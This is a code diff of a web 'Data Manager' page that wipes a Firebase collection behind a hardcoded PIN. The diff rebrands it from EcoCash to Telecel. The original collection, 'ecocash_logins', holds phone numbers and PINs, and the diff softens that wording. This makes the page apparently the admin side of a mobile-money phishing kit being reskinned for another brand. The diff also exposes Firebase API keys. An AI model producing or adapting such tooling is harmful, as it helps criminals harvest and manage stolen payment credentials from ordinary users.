@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EcoCash Data Manager</title>
+  <title>Telecel Data Manager</title>
   
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -18,7 +18,7 @@
     }
     
     body {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #ff4d4d 0%, #cc0000 100%);
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -39,7 +39,7 @@
     }
     
     .card-header {
-      background: linear-gradient(135deg, #1c6aa6, #125c9c);
+      background: linear-gradient(135deg, #ff0000, #cc0000);
       color: white;
       padding: 30px;
       text-align: center;
@@ -48,10 +48,24 @@
     .card-header h1 {
       font-size: 28px;
       margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
     
-    .card-header h1 span:first-child { color: #ffd700; }
-    .card-header h1 span:last-child { color: #ffffff; }
+    .header-logo {
+      width: 40px;
+      height: 40px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: 800;
+      color: #ff0000;
+    }
     
     .card-header p {
       opacity: 0.9;
@@ -68,13 +82,13 @@
       padding: 20px;
       margin-bottom: 25px;
       text-align: center;
-      border: 2px dashed #1c6aa6;
+      border: 2px dashed #ff0000;
     }
     
     .stats-number {
       font-size: 48px;
       font-weight: bold;
-      color: #1c6aa6;
+      color: #ff0000;
       line-height: 1.2;
     }
     
@@ -143,8 +157,8 @@
     }
     
     .pin-input:focus {
-      border-color: #1c6aa6;
-      box-shadow: 0 0 0 3px rgba(28,106,166,0.1);
+      border-color: #ff0000;
+      box-shadow: 0 0 0 3px rgba(255,0,0,0.1);
     }
     
     .pin-input.error {
@@ -313,7 +327,8 @@
     <div class="card">
       <div class="card-header">
         <h1>
-          <span>Eco</span><span>Cash</span>
+          <span class="header-logo">t</span>
+          <span>Telecel</span>
         </h1>
         <p>Data Management Tool</p>
       </div>
@@ -344,7 +359,7 @@
           <p>You are about to permanently delete ALL entries from the database. This action:</p>
           <ul>
             <li>Cannot be undone</li>
-            <li>Will erase all phone numbers and PINs</li>
+            <li>Will erase all account types and input values</li>
             <li>Removes all historical data</li>
           </ul>
         </div>
@@ -375,34 +390,35 @@
           <span>Erase All Data</span>
         </button>
         
-        <a href="#" class="cancel-btn" onclick="window.location.href='admin.html'; return false;">
+        <a href="telecel-admin.html" class="cancel-btn" id="cancelBtn">
           ← Cancel and Return
         </a>
       </div>
     </div>
     
     <div class="footer-links">
-      <a href="admin.html">View Admin Panel</a>
+      <a href="telecel-admin.html">View Admin Panel</a>
       <a href="#" onclick="location.reload(); return false;">Refresh Stats</a>
     </div>
   </div>
 
   <script>
     (function() {
-      // ==================== FIREBASE CONFIG ====================
+      // ==================== FIREBASE CONFIG (Telecel) ====================
       const firebaseConfig = {
-        apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
-        authDomain: "eco-panel-3d06e.firebaseapp.com",
-        projectId: "eco-panel-3d06e",
-        storageBucket: "eco-panel-3d06e.firebasestorage.app",
-        messagingSenderId: "820242007704",
-        appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
+        apiKey: "AIzaSyCjztxgN2BRjuHDMQnpNEuB7NE9C9R8nU0",
+        authDomain: "tele-panel.firebaseapp.com",
+        projectId: "tele-panel",
+        storageBucket: "tele-panel.firebasestorage.app",
+        messagingSenderId: "859165937892",
+        appId: "1:859165937892:web:db441a884b1a98c36b1cf1",
+        measurementId: "G-5ZPQ1H0SWR"
       };
 
       // Initialize Firebase
       firebase.initializeApp(firebaseConfig);
       const db = firebase.firestore();
-      const COLLECTION_NAME = 'ecocash_logins';
+      const COLLECTION_NAME = 'telecel_submissions'; // Adjust if different
 
       // ==================== DOM ELEMENTS ====================
       const pinInputs = [
@@ -420,9 +436,10 @@
       const successMessage = document.getElementById('successMessage');
       const errorMessage = document.getElementById('errorMessage');
       const errorText = document.getElementById('errorText');
+      const cancelBtn = document.getElementById('cancelBtn');
 
       // ==================== SECURITY PIN ====================
-      const CORRECT_PIN = '9999';
+      const CORRECT_PIN = '9999'; // Change as needed
       let isPinValid = false;
 
       // ==================== PIN AUTO-ADVANCE ====================
@@ -520,7 +537,7 @@
         }
 
         // Double confirm
-        if (!confirm('⚠️ ARE YOU ABSOLUTELY SURE?\n\nThis will permanently delete ALL entries. This cannot be undone!')) {
+        if (!confirm('⚠️ ARE YOU ABSOLUTELY SURE?\n\nThis will permanently delete ALL Telecel entries. This cannot be undone!')) {
           return;
         }
 
@@ -541,6 +558,8 @@
           if (total === 0) {
             progressContainer.style.display = 'none';
             showSuccess('No data to delete. Database is already empty.');
+            pinInputs.forEach(input => input.disabled = false);
+            deleteBtn.disabled = false;
             return;
           }
 
@@ -555,13 +574,12 @@
 
           for (let i = 0; i < batches; i++) {
             const start = i * batchSize;
-            const end = Math.min(start + batchSize, total);
             
             // Get batch of documents
             const batchSnapshot = await db.collection(COLLECTION_NAME)
               .orderBy('__name__')
               .startAt(snapshot.docs[start])
-          .limit(batchSize)
+              .limit(batchSize)
               .get();
 
             // Delete in a transaction
@@ -588,7 +606,7 @@
           
           setTimeout(() => {
             progressContainer.style.display = 'none';
-            showSuccess(`Successfully deleted ${deleted} entries from database.`);
+            showSuccess(`Successfully deleted ${deleted} entries from Telecel database.`);
             totalCountSpan.textContent = '0';
             
             // Reset PIN inputs
@@ -642,7 +660,7 @@
       setInterval(fetchCount, 5000);
 
       // Clear PINs when clicking cancel
-      document.querySelector('.cancel-btn').addEventListener('click', function() {
+      cancelBtn.addEventListener('click', function() {
         pinInputs.forEach(input => input.value = '');
       });
 
